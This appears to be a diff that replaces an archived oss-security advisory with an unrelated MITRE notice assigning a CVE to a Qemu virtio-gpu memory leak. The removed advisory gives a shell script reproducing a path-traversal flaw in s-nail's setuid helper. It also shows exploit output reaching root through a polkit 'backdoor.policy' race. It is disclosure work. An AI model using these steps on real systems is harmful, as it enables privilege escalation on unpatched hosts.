@@ -1,111 +1,47 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/27/7
-Message-ID: <283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>
-Date: Fri, 27 Jan 2017 22:03:00 +0100
-From: wapiflapi <wapiflapi@...oo.fr>
-To: oss-security@...ts.openwall.com
-Cc: Steffen Nurpmeso <steffen@...oden.eu>
-Subject: CVE Request: s-nail local root
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/25/2
+Message-ID: <46d26ca4fe15417db616d3cb54f2b07a@imshyb01.MITRE.ORG>
+Date: Wed, 25 Jan 2017 03:40:49 -0500
+From: <cve-assign@...re.org>
+To: <ppandit@...hat.com>
+CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>, <liqiang6-s@....cn>
+Subject: Re: CVE request Qemu: display: virtio-gpu: host memory leakage in virtio_gpu_resource_attach_backing
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-s-nail fixed a local root. This affects archlinux by default and other
-linux distros' packages (eg. ubuntu). Can we get a CVE for this ?
+> Quick Emulator(Qemu) built with the Virtio GPU Device emulator support is
+> vulnerable to a memory leakage issue. It could occur while processing
+> 'VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING' command.
+> 
+> A guest user/process could use this flaw to leak host memory resulting in DoS.
+> 
+> https://lists.nongnu.org/archive/html/qemu-devel/2017-01/msg00151.html
+> https://bugzilla.redhat.com/show_bug.cgi?id=1415795
+> http://git.qemu.org/?p=qemu.git;a=commit;h=204f01b30975923c64006f8067f0937b91eea68b
 
-https://www.mail-archive.com/s-nail-users@lists.sourceforge.net/msg00551.html
+Use CVE-2017-5578.
 
-Here is the advisory:
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-Affects
-=======
-
-S-nail (later S-mailx) is a mail processing system. It is intended to
-provide the functionality of the POSIX mailx command. It is installed by
-default on archlinux and is pulled in on ubuntu whenever mailx is
-needed. It might be used elsewhere.
-
-There is a vulnerability in the setuid root helper binary s-nail uses to
-handle lock files:
-
-  - archlinux: /usr/lib/mail-privsep
-  - ubuntu:    /usr/lib/s-nail/s-nail/privsep
-
-
-Reproducing the issue
-=====================
-
-The problem is that an O_EXCL file is created with a user controlled
-path because the di.di_hostname and di.di_randstr are never checked.
-This means that using s-nail-privsep a normal user can create a file
-anywhere on the filesystem, which is a security problem.
-
-The command is very picky about it's arguments. Here is an example
-script setting up the bug. This runs the setuid binary under strace so
-we can see the call to open() that we control followed by a call to
-fchown() giving us ownership.
-
-
-```
-# On archlinux it should be: /usr/lib/mail-privsep
-PRIVSEP=/usr/lib/s-nail/s-nail-privsep;
-
-# Some setup to get the directory traversal working.
-touch /tmp/foo
-mkdir -p /tmp/foo.lock.spam.eggs
-
-cd $(dirname $PRIVSEP);
-PATH=$PATH:. # argv[0] must be just the name.
-
-# stdin & stdout must be pipes !
-echo | strace -f $(basename $PRIVSEP) rdotlock \
-              mailbox /tmp/foo name /tmp/foo.lock \
-              hostname spam randstr eggs/../../../../../../../tmp/test \
-              pollmsecs 0 |& grep -E "foo\.lock\.spam\.eggs|chown";
-```
-
-
-Security Impact
-===============
-
-This issue can be leveraged by any logged in user to gain full root
-privileges.
-
-To exploit this we have to win a race condition and find a way to
-leverage the ephemeral file. We achieve this by adding a polkit policy
-and using pkexec su.
-
-A functional exploit is attached :-) Should look like this:
-
-```
-$ id
-uid=1000(wapiflapi) gid=1000(wapiflapi) groups=1000(wapiflapi)[...]
-$ ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
-[=] s-nail-privsep local root by @wapiflapi
-[+] Started flood in /usr/share/polkit-1/actions/backdoor.policy
-[+] Started race with /usr/lib/s-nail/s-nail-privsep
-[=] This could take a while...
-[/] wait for it: done
-root@box:~# id
-uid=0(root) gid=0(root) groups=0(root)
-```
-
-If the system doesn't have pkexec there are other ways to get root
-access from this. (`at` and `crontab` files come to mind.) The exploit
-is a bit slow (20s?), it's probably possible to be smarter about the
-race, but it's a poc ! ;-) Also if testing in a VM, having more than one
-cpu core helps a lot.
-
-
-Issue Timeline
-==============
-
-discovery:  26/01/2016
-disclosure: 27/01/2016
-vendor fix: 27/01/2016
-
-
-Regards,
-Wannes `wapiflapi` Rombouts
-
-View attachment "s-nail-privget.c" of type "text/x-csrc" (5025 bytes)
+iQIcBAEBCAAGBQJYiGO1AAoJEHb/MwWLVhi2tUAP/2Iz9iGa9RRpcc8Ppq4ilreh
+v/hllIcxHHmFB0n5vCktzLCtyANdU8YtELEow2VMIzHPgz7A4XYqEZRxcKwEmDti
+faoxcjbuTpJBuQFbm0EA9V3wEqSEKG86JPTHS8cpR/m2WSWZqre3cIMnSNkDwCkq
+KIJXy6urc8rBW+HNu+C+21lDyAWcjjXMEwY+nKVTDm9XovvxAmGXaLh59JY2ezrM
+7X9mZi/iRADkx9vAH2oIPI69v9YidArmmwiec2zs0SAlAMuNXYw61hZOCZw9agS/
+9Mj7xUqi9qxhqcnHnACiIvVfCdw2eoNS7GW0gLVSE+dEjpIf8hYsshK+ga7GD3xD
+YhqN89Bq7V8mkvqXmZP9bx+WpAG9/x72+lF2L9fcmFMYfVVvhYTStFsgk0lXt64m
+ZfyHvnU1IWUL6cCT2r918oubHgtCQEYEz7lMEFAjeSTPbe6GyQrbes4E2zXpn5zO
+3kQfnw+6vMN5q6YUOzsdYdb4d4ofJ4zybgI0BD+AZq0cAbxg+mr9Vb149fx1tVBy
+HTIgelALPWExAZwypRiZRmFryh3GFgmnSyV+u2TtyBp3O5CedzqKNX8ZYWVKPBGg
+/4ENdngGTv7pKbWHl8YhtS8AreDe3b+HoFSN1N6UYsMVuXiIpF7SNwh8QRdSPbJx
+acgNchNrffIyMEZ69vbT
+=J/T4
+-----END PGP SIGNATURE-----
